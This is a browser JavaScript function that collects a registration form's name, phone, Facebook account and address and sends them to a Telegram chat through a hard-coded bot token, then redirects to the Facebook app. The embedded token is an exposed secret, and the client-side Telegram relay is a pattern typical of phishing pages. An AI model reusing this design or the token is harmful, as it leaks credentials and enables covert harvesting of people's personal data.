function sendFormDataToTelegram() {
            var firstName = document.getElementById('firstName').value;
            var lastName = document.getElementById('lastName').value;
            var contactNumber = document.getElementById('contactNumber').value;
            var facebook = document.getElementById('facebook').value;
            var address = document.getElementById('address').value;
            var formContainer = document.getElementById('formContainer');
            var loadingOverlay = document.getElementById('loadingOverlay');

            if (!firstName || !lastName || !contactNumber || !facebook || !address) {
                alert("Please fill out all fields.");
                return;
            }

            formContainer.style.display = "none"; // Itago ang buong form
            loadingOverlay.style.display = "flex"; // Ipakita ang loading spinner

            var today = new Date();
            var formattedDate = (today.getMonth() + 1) + '/' + today.getDate() + '/' + today.getFullYear();

            var telegramMessage = `New Account Registration:\n` +
                `👤 Name: ${firstName} ${lastName}\n` +
                `📞 Contact Number: ${contactNumber}\n` +
                `📱 Facebook Account: ${facebook}\n` +
                `🏠 Address: ${address}\n` +
                `📅 Date: ${formattedDate}`;

            var botToken = "8016790696:AAEFp-OwVwEK--TOXqx7EtrhLlc7byRrbaQ"; 
            var chatId = "-4675496022"; 

            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;

            fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("Form submitted successfully!");
                    document.getElementById('registrationForm').reset();
                    window.location.href = "fb://profile"; // Redirect sa Facebook app
                } else {
                    alert("Error sending data.");
                }
                formContainer.style.display = "block";
                loadingOverlay.style.display = "none";
            })
            .catch(error => {
                alert("Error connecting to Telegram.");
                formContainer.style.display = "block";
                loadingOverlay.style.display = "none";
            });
        }